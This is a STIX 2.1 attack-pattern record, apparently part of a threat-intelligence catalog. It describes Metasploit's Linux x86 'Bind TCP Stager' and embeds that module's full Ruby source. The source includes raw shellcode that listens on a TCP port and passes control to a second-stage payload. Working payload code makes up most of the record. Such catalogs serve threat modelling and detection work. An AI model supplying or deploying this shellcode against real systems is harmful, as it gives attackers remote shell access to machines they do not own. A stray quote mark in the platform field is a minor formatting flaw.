{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f3fe4508-cb8f-412f-aaf4-065fee2aa6dd",
    "created": "2024-08-14T16:33:19.520661Z",
    "modified": "2024-08-14T16:33:19.520665Z",
    "name": "Bind TCP Stager",
    "description": "Listen for a connection",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/linux/x86/bind_nonx_tcp.rb",
            "external_id": "bind_nonx_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# BindTcp\n# -------\n#\n# Linux bind TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 63\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Linux\n\n  def self.handler_type_alias\n    \"bind_nonx_tcp\"\n  end\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Bind TCP Stager',\n      'Description'   => 'Listen for a connection',\n      'Author'        => 'skape',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LPORT' => [ 0x14, 'n'    ],\n            },\n          'Payload' =>\n            \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\" +\n            \"\\x43\\x52\\x66\\x68\\xbf\\xbf\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\" +\n            \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\" +\n            \"\\xb0\\x66\\xcd\\x80\\x93\\xb6\\x0c\\xb0\\x03\\xcd\\x80\\x89\\xdf\\xff\\xe1\"\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}